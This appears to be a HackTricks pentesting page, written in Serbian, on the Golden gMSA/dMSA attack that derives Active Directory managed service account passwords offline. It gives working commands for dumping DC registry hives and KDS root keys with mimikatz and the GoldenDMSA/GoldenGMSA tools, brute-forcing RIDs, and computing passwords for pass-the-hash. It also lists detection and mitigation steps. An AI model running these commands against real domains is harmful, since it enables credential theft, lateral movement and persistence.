# Golden gMSA/dMSA Attack (Offline Derivation of Managed Service Account Passwords)

{{#include ../../banners/hacktricks-training.md}}

## Overview

Windows Managed Service Accounts (MSA) su posebni principals dizajnirani za pokretanje servisa bez potrebe za ručnim upravljanjem njihovim lozinkama.
Postoje dve glavne varijante:

1. **gMSA** – group Managed Service Account – može se koristiti na više hostova koji su autorizovani u njegovom atributu `msDS-GroupMSAMembership`.
2. **dMSA** – delegated Managed Service Account – naslednik gMSA (u fazi preview), koji se oslanja na istu kriptografiju, ali omogućava granularnije scenarije delegiranja.

Kod obe varijante, **lozinka nije sačuvana** na svakom Domain Controlleru (DC) kao standardni NT-hash. Umesto toga, svaki DC može da izvede trenutnu lozinku u hodu pomoću:

* šumski-specifičnog **KDS Root Key** (`KRBTGT\KDS`) – nasumično generisana tajna imenovana GUID-om, replikovana na svaki DC u okviru kontejnera `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …`.
* SID-a ciljnog naloga.
* per-account **ManagedPasswordID** (GUID), koji se nalazi u atributu `msDS-ManagedPasswordId`.

Izvođenje je: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → blob veličine 240 bajtova, koji se na kraju **base64-encoded** i čuva u atributu `msDS-ManagedPassword`.
Tokom uobičajene upotrebe lozinke nije potreban Kerberos saobraćaj niti interakcija sa domenom – member host lokalno izvodi lozinku ako poseduje ova tri ulaza.

## Golden gMSA / Golden dMSA Attack

Ako napadač može da pribavi sva tri ulaza **offline**, može da izračuna **važeće trenutne i buduće lozinke** za bilo koji gMSA/dMSA u šumi, bez ponovnog pristupa DC-u, čime zaobilazi:<sup>[[1]](#references)[[2]](#references)</sup>

* LDAP read auditing
* intervale promene lozinke (može ih unapred izračunati)

Ovo je analogno *Golden Ticket* napadu na service accounts.<sup>[[1]](#references)[[2]](#references)</sup>

### Prerequisites

1. **Forest-level compromise** jednog DC-a (ili Enterprise Admin), odnosno `SYSTEM` pristup jednom od DC-ova u šumi.
2. Mogućnost enumeracije service accounts (LDAP read / RID brute-force).
3. .NET ≥ 4.7.2 x64 workstation za pokretanje [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) ili ekvivalentnog koda.<sup>[[3]](#references)</sup>

### Golden gMSA / dMSA
#### Phase 1 – Extract the KDS Root Key

Dump sa bilo kog DC-a (Volume Shadow Copy / raw SAM+SECURITY hives ili remote secrets):<sup>[[1]](#references)[[2]](#references)</sup>
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too

# With GoldendMSA
GoldendMSA.exe kds --domain <domain name>   # query KDS root keys from a DC in the forest
GoldendMSA.exe kds

# With GoldenGMSA
GoldenGMSA.exe kdsinfo
```
Base64 string označen kao `RootKey` (GUID naziv) potreban je u kasnijim koracima.<sup>[[1]](#references)[[2]](#references)</sup>

##### Faza 2 – Enumerisanje gMSA / dMSA objekata

Preuzmite najmanje `sAMAccountName`, `objectSid` i `msDS-ManagedPasswordId`:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId

GoldenGMSA.exe gmsainfo
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) implementira pomoćne režime:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
##### Faza 3 – Guess / Discover ManagedPasswordID (kada nedostaje)

Neke implementacije *uklanjaju* `msDS-ManagedPasswordId` iz čitanja zaštićenih ACL-om.
Pošto je GUID veličine 128 bita, naivni bruteforce nije izvodljiv, ali:

1. Prvih **32 bita = Unix epoch vreme** kreiranja naloga (preciznost u minutima).
2. Nakon toga sledi 96 nasumičnih bitova.

Zato je **uzak wordlist po nalogu** (± nekoliko sati) realan.
```bash
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
Alat izračunava kandidate za lozinku i upoređuje njihov base64 blob sa stvarnim atributom `msDS-ManagedPassword` – podudaranje otkriva ispravan GUID.

##### Faza 4 – Offline izračunavanje i konverzija lozinke

Kada je ManagedPasswordID poznat, validna lozinka je udaljena jednu komandu:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
```
Dobijeni hash-evi mogu biti injektovani pomoću **mimikatz** (`sekurlsa::pth`) ili alata **Rubeus** za Kerberos abuse, čime se omogućavaju stealth **lateral movement** i **persistence**.

## Detekcija i mitigacija

* Ograničite mogućnosti **DC backup and registry hive read** na Tier-0 administratore.
* Pratite kreiranje **Directory Services Restore Mode (DSRM)** ili **Volume Shadow Copy** na DC-ovima.
* Auditujte čitanja / izmene `CN=Master Root Keys,…` i `userAccountControl` flag-ova servisnih naloga.
* Detektujte neuobičajene **base64 password writes** ili iznenadnu ponovnu upotrebu lozinki servisa na hostovima.
* Razmotrite konvertovanje gMSA naloga sa visokim privilegijama u **classic service accounts** sa redovnim nasumičnim rotacijama tamo gde Tier-0 izolacija nije moguća.

## Alati

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – referentna implementacija korišćena na ovoj stranici.<sup>[[3]](#references)</sup>
* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – referentna implementacija korišćena na ovoj stranici.
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – pass-the-ticket korišćenjem izvedenih AES ključeva.

## Reference

- [1] [Golden dMSA – authentication bypass for delegated Managed Service Accounts](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [2] [gMSA Active Directory Attacks Accounts](https://www.semperis.com/blog/golden-gmsa-attack/)
- [3] [Semperis/GoldenDMSA GitHub repository](https://github.com/Semperis/GoldenDMSA)

{{#include ../../banners/hacktricks-training.md}}
